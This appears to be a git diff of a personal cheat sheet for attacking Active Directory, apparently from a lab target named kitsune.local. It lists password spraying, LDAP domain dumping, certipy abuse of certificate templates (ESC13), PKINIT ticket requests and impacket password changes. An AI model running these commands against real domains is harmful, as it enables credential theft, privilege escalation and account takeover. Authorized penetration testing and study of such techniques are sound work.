@@ -26,7 +26,7 @@ Wmi exec <hostname_or_target_ip> -ha <host_address> -UserName <username> -UserDo
 ldapdomaindump.py -u 'DOMAIN\username' -p 'password' HOSTNAME
 # check domain_policy to check password lockout
 nxc smb <target-ip-or-domain> -u users.txt -p Password123
-certipy find -u 'username@domain.local' -p 'password' -dc-ip <DC_IP> -vulnerable
+certipy-ad find -u 'username@domain.local' -p 'password' -dc-ip <DC_IP> -vulnerable
 # CHECK FOR AD CS VULNS!
 certipy-ad req -u "user@domain.local" -p "Password123" -ca "CORP-CA" -target "ca.corp.local" -template "ESC13TemplateName" # Request template
 python3 gettgtpkinit.py -cert-pfx ESC13TemplateName.pfx domain.local/user user.ccache
@@ -34,13 +34,16 @@ python3 gettgtpkinit.py -cert-pfx ESC13TemplateName.pfx domain.local/user user.c
 export KRB5CCNAME=user.ccache
 
 certipy-ad req -u user@domain.local -p 'Password' -target <HOSTNAME_OR_IP> -target-ip 192.168.1.50 -dc-ip 192.168.1.10 -template User -key-size 4096
+# Failed multiple times, but eventually worked? Try multiple times
 
 git clone https://github.com/dirkjanm/PKINITtools.git
 cd PKINITtools
-python3 -m venv .venv
-source .venv/bin/activate
+python3 -m venv .venv # creates it, if u already have installed skip
+source .venv/bin/activate 
 pip install -r requirements.txt
-python3 gettgtpkinit.py -h
+python3 gettgtpkinit.py -hv
+python3 gettgtpkinit.py -cert-pfx ~/workspace/targets/hs_kitsune/loot/tickets/ranch.pfx kitsune.local/ranch ~/workspace/targets/hs_kitsune/loot/tickets/ranch.ccache -dc-ip 10.1.152.66
+deactivate # to exit
 
 impacket-changepasswd KITSUNE.local/schlop@DC01.kitsune.local -aesKey <aes_key> -altuser ranch -no-pass -k -newpass 'Password1' -dc-ip 10.1.152.66
 impacket-describeTicket user.ccache --aes <aes_key>
